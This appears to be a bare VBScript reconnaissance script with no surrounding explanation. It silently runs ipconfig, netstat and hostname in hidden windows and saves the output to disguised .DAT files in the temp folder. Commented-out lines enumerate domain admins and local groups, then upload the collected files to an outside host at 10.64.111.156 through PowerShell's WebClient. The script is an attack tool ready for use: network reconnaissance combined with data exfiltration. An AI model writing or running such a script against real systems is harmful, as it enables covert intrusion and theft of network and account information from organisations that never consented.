Set oShell = WScript.CreateObject("WScript.Shell")
return = oShell.run("cmd /c ipconfig >> %TEMP%\FUBDEEY67.DAT", 0, true)
return = oShell.run("cmd /c netstat >> %TEMP%\MBFEWQ234.DAT", 0, true)
return = oShell.run("cmd /c hostname >> %TEMP%\IUHFSA789.DAT", 0, true)
'return = oShell.run("cmd /c net group 'domain admins' /domain >> %TEMP%\domainadmins.txt", 0, true)
'return = oShell.run("cmd /c net localgroup /domain >> %TEMP%\localgroup.txt", 0, true)

'return = oShell.run("powershell.exe $file='c:\temp\ipconfig.txt'; $wc = New-Object System.Net.WebClient; $resp = $wc.UploadFile('http://10.64.111.156',$file)", 0, true)
'return = oShell.run("powershell.exe $file='c:\temp\hostname.txt'; $wc = New-Object System.Net.WebClient; $resp = $wc.UploadFile('http://10.64.111.156',$file)", 0, true)
'return = oShell.run("powershell.exe $file='c:\temp\netstat.txt'; $wc = New-Object System.Net.WebClient; $resp = $wc.UploadFile('http://10.64.111.156',$file)", 0, true)
'return = oShell.run("powershell.exe $file='c:\temp\domainadmins.txt'; $wc = New-Object System.Net.WebClient; $resp = $wc.UploadFile('http://10.64.111.156',$file)", 0, true)
'return = oShell.run("powershell.exe $file='c:\temp\localgroup.txt'; $wc = New-Object System.Net.WebClient; $resp = $wc.UploadFile('http://10.64.111.156',$file)", 0, true)
